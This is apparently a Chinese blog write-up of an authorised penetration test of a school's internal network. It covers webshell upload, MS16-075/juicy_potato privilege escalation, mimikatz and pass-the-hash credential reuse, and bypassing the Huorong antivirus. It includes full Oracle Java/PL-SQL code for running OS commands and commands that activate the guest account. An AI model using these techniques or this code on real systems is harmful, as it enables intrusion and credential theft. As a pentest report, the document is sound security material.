### 初探内网
在向信息中心的老师申请了对学校进行一次内网渗透测试的授权之后，我开始着手对学校内网中在用系统进行了一波信息搜集。其中大部分都使用了新版的未爆出0day的框架组件，这让我一开始的打点过程陷入僵局。但是在我重新翻了一遍学校开放的各种web系统后，我发现了一些令人惊喜的系统。
学校使用了很多新系统，但是并没有把老系统关闭，经过一番搜索确定了这个老系统存在任意文件上传漏洞。
没有任何过滤，可以说就是捡漏了。
而且也返回了一句话木马的路径。但是我遇到了一个很奇怪的现象，用蚁剑和用菜刀连接后，返回的路径不一样，其中的文件也不一样。
其中蚁剑连接的shell无法上传文件，而菜刀连接的却可以，并且webshell执行一次命令后就会封禁IP，怀疑有waf。所以我先传了一个msf的aspx木马来获取一个meterpreter的会话。使用windows-exploit-suggest探测未打的补丁。
发现存在MS16-075这个非常好用的漏洞，直接配合msf的juicy_potato模块来攻击，记住要修改CLSID，可以在这里找
使用的payload最好要选择正向连接 bind_tcp，不然有可能弹不回来shell。
这样就获取了system权限。接下来就是对机器进行信息搜集，获取对我们横向渗透有帮助的信息。很奇怪的一点是，这台机器本来是有域的，但现在却没有了，且无法找到域控。所以我们的重点放在密码撞库。使用msf自带的mimikatz模块来获取密码。
撞到了两三台机器，还有一些机器是开着445端口，但没有开3389端口。
这样我们可以尝试使用ms-17010，但考虑可能会对某些正在使用的系统造成影响，我还是选择使用更稳妥的
psexec模块来进行撞库。也就是哈希传递，有时候我们碰到无法获取明文的密码，可以考虑dump出密码的hash值，再使用psexec模块进行哈希传递，来进行攻击，获取到的都是SYSTEM权限。
后面的步骤索然无味，就是不断的撞库搜集密码，然后再通过搜集的密码再撞库，获取到了足够多的机器和密码之后，找到了边界路由器，但是之前搜集的密码都无法成功登录，只好放弃。这个网段就告一段落。
## **深入探索**
经过对新系统的一番搜索，我在其中的一个功能中找到了任意文件下载漏洞。
并且是root用户起的服务，最理想的情况就是，读取/etc/shadow文件，爆破root用户密码。（失败），然后尝试读取/root/.bash_history
来获取root用户的操作历史记录。其中记录了tomcat部署的路径，以及备份的源码文件。通过下载源码进行信息搜集，我搜集到了一个很关键的信息，这个网段的机器大多数使用oracle数据库，并且没有修改SID，手里还有几个可以尝试的密码。
经过一番爆破，发现了一台机器oracle数据库system用户密码未修改，为manager。大家应该指定oracle数据库是可以执行系统命令的，而system用户完全符合执行系统命令的条件。网上找到一个工具，去掉了繁琐的步骤，可以直接执行命令。
## **绕过火绒行为检测**
但是又出现了一个很奇怪的问题，我只能执行少数的几个命令，虽然我是system用户，但我一旦使用到 net
user之类的命令时，就没有了回显。后面发现是火绒拦截了异常行为。然后我尝试了直接使用 navicat
中的sqlplus来连接服务器。根据网上的步骤建立执行命令的代码，我可以根据服务器返回的1或0来判断命令是否执行。
    create or replace and compile Java Source named "OSCommand" as
    -- java:        OS COMMAND
    import java.io.*;
    import java.lang.*;
    public class OSCommand{
            public static String Run(String Command){
                    Runtime rt = Runtime.getRuntime();
                    int     rc = -1;
                    try{
                            Process p = rt.exec( Command );
                            int bufSize = 32000;
                            int len = 0;
                            byte buffer[] = new byte[bufSize];
                            String s = null;
                            BufferedInputStream bis = new BufferedInputStream( p.getInputStream(), bufSize );
                            len = bis.read( buffer, 0, bufSize );
                            rc = p.waitFor();
                            if ( len != -1 ){
                                    s = new String( buffer, 0, len );
                                    return( s );
                            }
                            return( rc+"" );
                    }
                    catch (Exception e){
                            e.printStackTrace();
                            return(  "-1\ncommand[" + Command + "]\n" + e.getMessage() );
                    }
            }
    }
    /
    show errors
    create or replace function OSexec( cCommand IN string ) return varchar2 is
    -- function:    OS EXEC
    -- descr:       PL/SQL wrapper for the Java OSCOMMAND stored proc
    --    language        JAVA
    name            'OSCommand.Run(java.lang.String) return java.lang.String';
    /
    show errors
    -- sysdba. Substitute SCOTT with the applicable schema that owns the OSEXEC
    -- and OSCOMMAND stored procs.
    declare
            SCHEMA  varchar2(30) := 'SCOTT';
    begin
            dbms_java.grant_permission(
                    SCHEMA,
                    'SYS:java.io.FilePermission',
                    '>',
                    'execute'
            );
            dbms_java.grant_permission(
                    SCHEMA,
                    'SYS:java.lang.RuntimePermission',
                    'writeFileDescriptor',
                    '*'
            );
            dbms_java.grant_permission(
                    SCHEMA,
                    'SYS:java.lang.RuntimePermission',
                    'readFileDescriptor',
                    '*'
            );
    commit;
    end;
    /
    -- 查看本地连接信息
    SQL> select OSexec('ipconfig') as STDOUT from dual;
    STDOUT
    --------------------------------------------------------------------------------    Windows IP ????
    ??????????? ????l?? 3:
       l??????? DNS ??? . . . . . . . :
       ????t?? IPv6 ???. . . . . . . . : *************
       IPv4 ??? . . . . . . . . . . . . : 192.168.100.100
       ????????  . . . . . . . . . . . . : 255.255.255.0
       ??????. . . . . . . . . . . . . : 0.0.0.0
    --激活guest账号
     SQL> select OSexec('cmd.exe /c net user guest /active:yes') as STDOUT from dual;
    STDOUT
    --------------------------------------------------------------------------------    0
因为存在杀毒软件监控oracle的行为，所以得要通过一些不被拦截的行为来组合起来攻击。
让我没想到的是，当我直接执行命令行开启3389端口时，火绒居然没有拦截。但当我执行net
user等命令的时候又无法执行。这时候我突然想起来guest用户，我启用guest用户，然后加入管理员组，这一次没有被拦截。直接远程桌面连接以后，当我想在机器上使用mimikatz或者是反弹一个shell到cs上都失败了。
并且guest用户还有一些权限被禁用了，比如添加用户等敏感操作。但是我执行net
user的时候发现了一个用户，这个用户我在之前的机器上见过，并且我有这个用户的密码。所以再通过sqlplus来将这个用户加入管理员组。
所以火绒拦截的行为规则就是不能添加用户，但是可以把已存在的用户加入管理员组，并且guest用户可激活，可开3389。在我再次登录这个机器之后，还是没有办法反弹shell回来，或者是读出它的密码。这时候学弟和我说，可以直接打开火绒，关闭防护，就可以反弹shell了。我？？？？？
然后一通操作拿到了shell，但是还是读不出明文密码，我就想着把哈希dump出来然后去爆破。但是又想起来有一个国外的在线网站可以解NTLM
获取密码之后，又是熟悉的撞库，信息搜集，再撞库。
然后在服务器上发现了一个xftp保存了几台服务器的密码，这个时候发现一个骚操作，可以用一个星号密码查看器的工具，来查看这里保存的密码。
又喜提几台root权限的机器。后面要考试就不想玩了，把所有搜集的密码用户记录，然后撞整个网段的机器，撞出了很多弱口令。
恭喜信息中心老师喜提加班。
请大佬们轻喷。。。。